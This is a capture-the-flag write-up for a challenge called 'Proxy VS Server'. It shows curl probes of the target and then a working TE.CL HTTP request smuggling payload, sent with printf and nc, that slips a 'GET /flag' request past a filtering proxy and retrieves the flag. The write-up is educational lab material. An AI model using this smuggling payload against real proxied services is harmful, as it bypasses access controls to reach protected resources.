# Proxy VS Server

## Description

The task is to read the `/flag` file! No enumeration is needed!
- [url](http://139.162.181.199:1338/)

## Solution

```bash
└─$ curl http://139.162.181.199:1338 -i
HTTP/1.1 200 OK
Date: Sat, 07 Feb 2026 08:23:44 GMT
Content-Length: 264
Content-Type: text/plain; charset=utf-8

I am the watcher at the threshold, guardian of the hidden flame, bearer of the light that does not fade. Your tricks and shadows hold no power here, spawn of corrupted code. This flag is under my watch. Turn back now — the gate is sealed, and you will not pass.
```

```bash
└─$ curl http://139.162.181.199:1338/flag -i
HTTP/1.1 403 Forbidden
Content-Length: 32
Connection: close

Why are u so obsessed with flag?
```

Different message, but 400 error
```bash
└─$ curl http://139.162.181.199:1338/ -i -X POST
HTTP/1.1 400 Bad Request
Content-Length: 34
Connection: close

You are getting closer and closer!                                                                                                                                                           
```

Wut
```bash
└─$ curl http://139.162.181.199:1338/ -X POST -d 'x=y'
I am the watcher at the threshold, guardian of the hidden flame, bearer of the light that does not fade. Your tricks and shadows hold no power here, spawn of corrupted code. This flag is under my watch. Turn back now — the gate is sealed, and you will not pass.

└─$ curl http://139.162.181.199:1338/ -X POST --json '{}'
I am the watcher at the threshold, guardian of the hidden flame, bearer of the light that does not fade. Your tricks and shadows hold no power here, spawn of corrupted code. This flag is under my watch. Turn back now — the gate is sealed, and you will not pass.
```

If URL has word `flag` it's always rejected. As title of challenge suggests Proxy is guarding the application and passing requests to backend. We somehow need to trick webserver into giving us the flag, and some Proxy parsers allow HTTP request smuggling.

```
                    ┌─────────────────────────────┐
                    │          PROXY              │
                    │  Parses: Transfer-Encoding  │
                    │  Sees: POST /  (allowed)    │
  Your request ───► │  Forwards entire payload ───┼──►  ┌───────────────┐
                    └─────────────────────────────┘     │   BACKEND     │
                                                        │  Parses: CL=4 │
                                                        │  Req 1: POST /│
                                                        │  Req 2: GET /flag ← smuggled!
                                                        │  Returns flag │
                                                        └───────────────┘
```

- [Lab: HTTP request smuggling, basic TE.CL vulnerability](https://medium.com/infosecmatrix/24-14-lab-http-request-smuggling-basic-te-cl-vulnerability-2024-f0159b2569d0)

```bash
└─$ printf 'POST / HTTP/1.1\r\nHost: 139.162.181.199:1338\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1f\r\nGET /flag HTTP/1.1\r\nHost: x\r\n\r\n\r\n0\r\n\r\n' | nc 139.162.181.199 1338
HTTP/1.1 200 OK
Date: Sat, 07 Feb 2026 08:40:19 GMT
Content-Length: 264
Content-Type: text/plain; charset=utf-8

I am the watcher at the threshold, guardian of the hidden flame, bearer of the light that does not fade. Your tricks and shadows hold no power here, spawn of corrupted code. This flag is under my watch. Turn back now — the gate is sealed, and you will not pass.
HTTP/1.1 200 OK
Date: Sat, 07 Feb 2026 08:40:19 GMT
Content-Length: 28
Content-Type: text/plain; charset=utf-8

DGA{L0V3_C0NFU51NG_SYST3M5}
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request
```

::: tip Flag
`DGA{L0V3_C0NFU51NG_SYST3M5}`
:::

